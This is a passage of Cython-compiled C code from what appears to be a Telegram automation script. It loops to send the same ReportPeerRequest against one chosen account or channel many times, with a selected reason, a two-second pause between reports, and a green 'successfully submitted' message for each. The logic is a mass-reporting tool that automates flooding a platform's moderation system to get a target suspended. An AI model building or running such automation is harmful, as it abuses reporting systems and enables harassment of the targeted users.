          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_14) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_14);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 201, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_num_reports);
      __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_num_reports, __pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_1);
      __pyx_t_1 = 0;

      
      __pyx_t_10 = (__Pyx_PyUnicode_Equals(__pyx_cur_scope->__pyx_v_num_reports, __pyx_n_u_home, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 203, __pyx_L1_error)
      if (__pyx_t_10) {

        
        goto __pyx_L4_continue;

        
      }

      
      __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 206, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      /*try:*/ {

        
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_cur_scope->__pyx_v_num_reports); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L75_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
          __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_9 = 0;
          __pyx_t_20 = NULL;
        } else {
          __pyx_t_9 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 209, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_20 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 209, __pyx_L75_error)
        }
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        for (;;) {
          if (likely(!__pyx_t_20)) {
            if (likely(PyList_CheckExact(__pyx_t_2))) {
              if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_2)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 209, __pyx_L75_error)
              #else
              __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L75_error)
              __Pyx_GOTREF(__pyx_t_1);
              #endif
            } else {
              if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 209, __pyx_L75_error)
              #else
              __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L75_error)
              __Pyx_GOTREF(__pyx_t_1);
              #endif
            }
          } else {
            __pyx_t_1 = __pyx_t_20(__pyx_t_2);
            if (unlikely(!__pyx_t_1)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 209, __pyx_L75_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_1);
          }
          __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
          __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
          __Pyx_GIVEREF(__pyx_t_1);
          __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_ReportPeerRequest); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_3 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_3);
          if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_peer, __pyx_cur_scope->__pyx_v_entity) < 0) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __pyx_t_19 = __Pyx_PyObject_GetItem(__pyx_t_21, __pyx_cur_scope->__pyx_v_reason_choice); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __pyx_t_21 = __Pyx_GetItemInt(__pyx_t_19, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_reason, __pyx_t_21) < 0) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __pyx_t_19 = __Pyx_PyObject_GetItem(__pyx_t_21, __pyx_cur_scope->__pyx_v_reason_choice); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __pyx_t_21 = __Pyx_GetItemInt(__pyx_t_19, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_t_21, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __pyx_t_21 = __Pyx_PyUnicode_Concat(__pyx_kp_u_Reported_for, __pyx_t_19); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_message, __pyx_t_21) < 0) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __pyx_t_21 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_INCREF(__pyx_cur_scope->__pyx_v_client);
          __pyx_t_3 = __pyx_cur_scope->__pyx_v_client; __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_14, __pyx_t_21) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_21);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 210, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_1);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XGOTREF(__pyx_r);
          if (likely(__pyx_r)) {
            __Pyx_XGIVEREF(__pyx_t_2);
            __pyx_cur_scope->__pyx_t_0 = __pyx_t_2;
            __pyx_cur_scope->__pyx_t_3 = __pyx_t_9;
            __pyx_cur_scope->__pyx_t_5 = __pyx_t_20;
            __Pyx_XGIVEREF(__pyx_r);
            __Pyx_RefNannyFinishContext();
            __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
            /* return from generator, awaiting value */
            __pyx_generator->resume_label = 4;
            return __pyx_r;
            __pyx_L79_resume_from_await:;
            __pyx_t_2 = __pyx_cur_scope->__pyx_t_0;
            __pyx_cur_scope->__pyx_t_0 = 0;
            __Pyx_XGOTREF(__pyx_t_2);
            __pyx_t_9 = __pyx_cur_scope->__pyx_t_3;
            __pyx_t_20 = __pyx_cur_scope->__pyx_t_5;
            if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 210, __pyx_L75_error)
          } else {
            PyObject* exc_type = __Pyx_PyErr_Occurred();
            if (exc_type) {
              if (likely(exc_type == PyExc_StopIteration || (exc_type != PyExc_GeneratorExit && __Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))) PyErr_Clear();
              else __PYX_ERR(0, 210, __pyx_L75_error)
            }
          }

          
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 212, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_3);

          
          __pyx_t_21 = PyTuple_New(3); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 213, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_21);
          __pyx_t_11 = 0;
          __pyx_t_18 = 127;
          __Pyx_INCREF(__pyx_kp_u_Report_2);
          __pyx_t_11 += 9;
          __Pyx_GIVEREF(__pyx_kp_u_Report_2);
          PyTuple_SET_ITEM(__pyx_t_21, 0, __pyx_kp_u_Report_2);
          __pyx_t_14 = __Pyx_PyInt_AddObjC(__pyx_cur_scope->__pyx_v_i, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 213, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_t_14, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 213, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_18;
          __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
          __Pyx_GIVEREF(__pyx_t_19);
          PyTuple_SET_ITEM(__pyx_t_21, 1, __pyx_t_19);
          __pyx_t_19 = 0;
          __Pyx_INCREF(__pyx_kp_u_successfully_submitted);
          __pyx_t_11 += 26;
          __Pyx_GIVEREF(__pyx_kp_u_successfully_submitted);
          PyTuple_SET_ITEM(__pyx_t_21, 2, __pyx_kp_u_successfully_submitted);
          __pyx_t_19 = __Pyx_PyUnicode_Join(__pyx_t_21, 3, __pyx_t_11, __pyx_t_18); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 213, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __pyx_t_21 = NULL;
          __pyx_t_12 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_21)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_21);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
              __pyx_t_12 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_3)) {
            PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_19, __pyx_n_u_green};
            __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L75_error)
            __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
            PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_19, __pyx_n_u_green};
            __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L75_error)
            __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          } else
          #endif
          {
            __pyx_t_14 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 212, __pyx_L75_error)
            __Pyx_GOTREF(__pyx_t_14);
            if (__pyx_t_21) {
              __Pyx_GIVEREF(__pyx_t_21); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_21); __pyx_t_21 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_19);
            PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_12, __pyx_t_19);
            __Pyx_INCREF(__pyx_n_u_green);
            __Pyx_GIVEREF(__pyx_n_u_green);
            PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_12, __pyx_n_u_green);
            __pyx_t_19 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L75_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 211, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 215, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 215, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
            }
          }
          __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_14, __pyx_t_1, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_int_2);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 215, __pyx_L75_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_colored); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 216, __pyx_L75_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 216, __pyx_L75_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 216, __pyx_L75_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_client, __pyx_n_s_disconnect); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 218, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_2 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 218, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_2);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XGOTREF(__pyx_r);
          if (likely(__pyx_r)) {
            __Pyx_XGIVEREF(__pyx_r);
            __Pyx_RefNannyFinishContext();
            __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
            /* return from generator, awaiting value */
            __pyx_generator->resume_label = 5;
            return __pyx_r;
            __pyx_L80_resume_from_await:;
            if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 218, __pyx_L1_error)
          } else {
            PyObject* exc_type = __Pyx_PyErr_Occurred();
            if (exc_type) {
              if (likely(exc_type == PyExc_StopIteration || (exc_type != PyExc_GeneratorExit && __Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))) PyErr_Clear();
              else __PYX_ERR(0, 218, __pyx_L1_error)
            }
          }
          goto __pyx_L76;
        }
        __pyx_L75_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_assign
          __pyx_t_6 = 0; __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
          __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_24, &__pyx_t_25, &__pyx_t_26);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8) < 0)) __Pyx_ErrFetch(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
          __Pyx_XGOTREF(__pyx_t_6);
          __Pyx_XGOTREF(__pyx_t_7);
          __Pyx_XGOTREF(__pyx_t_8);
          __Pyx_XGOTREF(__pyx_t_24);
          __Pyx_XGOTREF(__pyx_t_25);
          __Pyx_XGOTREF(__pyx_t_26);
          __pyx_t_12 = __pyx_lineno; __pyx_t_13 = __pyx_clineno; __pyx_t_31 = __pyx_filename;
          {
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_client, __pyx_n_s_disconnect); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 218, __pyx_L84_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_14 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_14)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_14);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_2 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 218, __pyx_L84_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XGOTREF(__pyx_r);
            if (likely(__pyx_r)) {
              __Pyx_XGIVEREF(__pyx_t_6);
              __pyx_cur_scope->__pyx_t_0 = __pyx_t_6;
              __Pyx_XGIVEREF(__pyx_t_7);
              __pyx_cur_scope->__pyx_t_1 = __pyx_t_7;
              __Pyx_XGIVEREF(__pyx_t_8);
              __pyx_cur_scope->__pyx_t_2 = __pyx_t_8;
              __pyx_cur_scope->__pyx_t_6 = __pyx_t_12;
              __pyx_cur_scope->__pyx_t_7 = __pyx_t_13;
              __Pyx_XGIVEREF(__pyx_t_24);
              __pyx_cur_scope->__pyx_t_4 = __pyx_t_24;
              __Pyx_XGIVEREF(__pyx_t_25);
              __pyx_cur_scope->__pyx_t_8 = __pyx_t_25;
              __Pyx_XGIVEREF(__pyx_t_26);
              __pyx_cur_scope->__pyx_t_9 = __pyx_t_26;
              __pyx_cur_scope->__pyx_t_10 = __pyx_t_31;
              __Pyx_XGIVEREF(__pyx_r);
              __Pyx_RefNannyFinishContext();
              __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
              /* return from generator, awaiting value */
              __pyx_generator->resume_label = 6;
              return __pyx_r;
              __pyx_L85_resume_from_await:;
              __pyx_t_6 = __pyx_cur_scope->__pyx_t_0;
              __pyx_cur_scope->__pyx_t_0 = 0;
              __Pyx_XGOTREF(__pyx_t_6);
              __pyx_t_7 = __pyx_cur_scope->__pyx_t_1;
              __pyx_cur_scope->__pyx_t_1 = 0;
              __Pyx_XGOTREF(__pyx_t_7);
              __pyx_t_8 = __pyx_cur_scope->__pyx_t_2;
              __pyx_cur_scope->__pyx_t_2 = 0;
              __Pyx_XGOTREF(__pyx_t_8);
              __pyx_t_12 = __pyx_cur_scope->__pyx_t_6;
              __pyx_t_13 = __pyx_cur_scope->__pyx_t_7;
              __pyx_t_24 = __pyx_cur_scope->__pyx_t_4;
              __pyx_cur_scope->__pyx_t_4 = 0;
              __Pyx_XGOTREF(__pyx_t_24);
              __pyx_t_25 = __pyx_cur_scope->__pyx_t_8;
              __pyx_cur_scope->__pyx_t_8 = 0;
              __Pyx_XGOTREF(__pyx_t_25);
              __pyx_t_26 = __pyx_cur_scope->__pyx_t_9;
              __pyx_cur_scope->__pyx_t_9 = 0;
              __Pyx_XGOTREF(__pyx_t_26);
              __pyx_t_31 = __pyx_cur_scope->__pyx_t_10;
              if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 218, __pyx_L84_error)
            } else {
              PyObject* exc_type = __Pyx_PyErr_Occurred();
              if (exc_type) {
                if (likely(exc_type == PyExc_StopIteration || (exc_type != PyExc_GeneratorExit && __Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))) PyErr_Clear();
                else __PYX_ERR(0, 218, __pyx_L84_error)
              }
            }
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_24);
            __Pyx_XGIVEREF(__pyx_t_25);
            __Pyx_XGIVEREF(__pyx_t_26);
            __Pyx_ExceptionReset(__pyx_t_24, __pyx_t_25, __pyx_t_26);
          }
          __Pyx_XGIVEREF(__pyx_t_6);
          __Pyx_XGIVEREF(__pyx_t_7);
          __Pyx_XGIVEREF(__pyx_t_8);
          __Pyx_ErrRestore(__pyx_t_6, __pyx_t_7, __pyx_t_8);
          __pyx_t_6 = 0; __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __pyx_lineno = __pyx_t_12; __pyx_clineno = __pyx_t_13; __pyx_filename = __pyx_t_31;
          goto __pyx_L1_error;
          __pyx_L84_error:;
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_24);
            __Pyx_XGIVEREF(__pyx_t_25);
            __Pyx_XGIVEREF(__pyx_t_26);
            __Pyx_ExceptionReset(__pyx_t_24, __pyx_t_25, __pyx_t_26);
          }
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          goto __pyx_L1_error;
        }
        __pyx_L76:;
      }
    }
    __pyx_L7:;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 220, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_exit); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 220, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_14);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_14);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_14, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_14);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 220, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_L4_continue:;
  }
  __pyx_L5_break:;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  

  /* function exit code */
